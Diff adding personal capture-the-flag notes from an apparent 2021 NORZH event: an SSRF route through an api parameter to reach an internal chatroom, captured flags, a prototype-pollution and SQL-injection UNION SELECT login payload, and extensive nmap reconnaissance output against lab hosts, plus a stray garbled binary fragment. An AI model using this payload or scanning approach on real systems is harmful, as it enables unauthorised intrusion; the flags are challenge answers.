@@ -18,3 +18,159 @@ http://10.40.3.230:8100/api/call_api.php?api=10.0.42.xxx all the same up to the 
 if you iterate over the 10.0.42.0/24 subnet with GETs, you find at 10.0.42.200 a chatroom
 with the second triskel flag
 NORZH{You_just_SSRFed_your_way_in!!!}
+
+Pre-Challenge
+Claims by a teammate that it can solved via a combination of prototype pollution and sqli
+{"username":"a","password":"a",
+"__proto__":{
+"__proto__":{
+"staffOnly": "true UNION ALL SELECT id,'a',firstName,lastName,'1f40fc92da241694750979ee6cf582f2d5d7d28e18335de05abc54d0560e0f5302860c652bf08d560252aa5e74210546f369fbbbce8c12cfc7957b2652fe9a75',staff FROM user WHERE id = 1"
+}}}
+
+Here are my notes from the CTF
+
+krb524
+└─$ sudo nmap -sn 172.17.0.1/24
+[sudo] password for kali: 
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-22 14:31 EDT
+Nmap scan report for 172.17.0.1
+Host is up.
+Nmap done: 256 IP addresses (1 host up) scanned in 10.77 seconds
+
+
+└─$ sudo nmap -sN 172.17.0.1   
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-21 22:49 EDT
+Nmap scan report for 172.17.0.1
+Host is up (0.000010s latency).
+Not shown: 999 closed ports
+PORT     STATE         SERVICE
+4444/tcp open|filtered krb524
+
+─$ sudo nmap -sN 172.16.64.248/29 10.0.0.0/8 -f 
+
+Discovered open port 110/tcp on 172.17.0.1 - pop3                                     
+Discovered open port 10086/tcp on 172.17.0.1                                   
+Discovered open port 143/tcp on 172.17.0.1 - imap                                     
+Discovered open port 443/tcp on 172.17.0.1 - https                                     
+Discovered open port 80/tcp on 172.17.0.1 - http                                      
+Discovered open port 995/tcp on 172.17.0.1 - pop3s                                     
+Discovered open port 993/tcp on 172.17.0.1 - imaps                                     
+Discovered open port 465/tcp on 172.17.0.1 - submissions
+
+└─$ sudo nmap -sO 172.17.0.1                                                                                                                                                                                                             1 ⨯
+
+Not shown: 248 closed protocols
+PROTOCOL STATE         SERVICE
+1        open          icmp
+2        open|filtered igmp
+6        open          tcp
+17       open          udp
+47       open|filtered gre
+103      open|filtered pim
+136      open|filtered udplite
+255      open|filtered unknown
+
+Nmap scan report for 172.17.0.2
+Host is up (0.00015s latency).
+Not shown: 242 closed protocols
+PROTOCOL STATE         SERVICE
+1        open          icmp
+2        open|filtered igmp
+6        open          tcp
+11       open|filtered nvp-ii
+17       open          udp
+57       open|filtered skip
+85       open|filtered nsfnet-igp
+91       open|filtered larp
+100      open|filtered gmtp
+103      open|filtered pim
+136      open|filtered udplite
+156      open|filtered unknown
+170      open|filtered unknown
+230      open|filtered unknown
+MAC Address: 02:42:AC:11:00:02 (Unknown)
+    
+└─$ sudo nmap -sL 172.16.64.248/29 10.0.0.0/8 > networkscan.txt    
+
+└─$ sudo nmap -sO 10.0.2.2  
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-22 13:32 EDT
+Nmap scan report for 10.0.2.2
+Host is up (0.00053s latency).
+Not shown: 253 open|filtered protocols
+PROTOCOL STATE SERVICE
+1        open  icmp
+6        open  tcp
+17       open  udp
+MAC Address: 52:54:00:12:35:02 (QEMU virtual NIC)
+80 	ack
+
+└─$ sudo nmap -sO 10.0.2.15
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-22 14:05 EDT
+Nmap scan report for 10.0.2.15
+Host is up (0.0000050s latency).
+Not shown: 249 closed protocols
+PROTOCOL STATE         SERVICE
+1        open          icmp
+2        open|filtered igmp
+6        open          tcp
+17       open          udp
+103      open|filtered pim
+136      open|filtered udplite
+255      open|filtered unknown
+
+ET_Ç@Æ¬@ý
+(çõàK3H©`¦BNORZH{l3t5_go_!}NORZH{l3t5_go_!}NORZH{l3
+
+└─$ sudo nmap -sO 10.40.3.231    
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-22 14:12 EDT
+Nmap scan report for 10.40.3.231
+Host is up (0.13s latency).
+Not shown: 254 open|filtered protocols
+PROTOCOL STATE SERVICE
+1        open  icmp
+6        open  tcp
+
+
+└─$ sudo nmap -sS -A 10.40.3.231 -v
+map scan report for 10.40.3.231
+Host is up (0.13s latency).
+Not shown: 999 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 94:30:b8:68:93:72:57:79:81:09:74:67:ab:74:6b:be (RSA)
+|   256 79:e1:8e:a5:99:bf:4b:47:19:ee:34:9a:11:04:70:b1 (ECDSA)
+|_  256 19:4b:f3:b3:c7:22:5c:f5:78:db:95:51:f9:ef:4c:6d (ED25519)
+Device type: general purpose
+Running: Linux 5.X
+OS CPE: cpe:/o:linux:linux_kernel:5
+OS details: Linux 5.0 - 5.3
+
+└─$ sudo nmap -sS -A 10.40.3.230 -v
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 45:3e:06:62:6f:f3:a0:01:74:18:9a:1f:5b:09:a3:60 (RSA)
+|   256 53:ab:3f:69:7e:95:76:e0:7c:22:9f:75:66:1b:22:ae (ECDSA)
+|_  256 96:22:d3:1b:2d:69:43:6e:0f:d7:1d:23:2e:9b:1b:f1 (ED25519)
+8100/tcp open  http    Apache httpd 2.4.33 ((Unix))
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.33 (Unix)
+|_http-title: Medisin
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.6
+
+On the website http://10.40.3.230:8100
+url: 'api/call_api.php?api=10.0.42.100/api/',
+
+sudo nmap -sS -A 10.0.42.100 -v
+-sO still nothing
+
+Apach 2.4.33 - PHP/7.2.7 xprint server
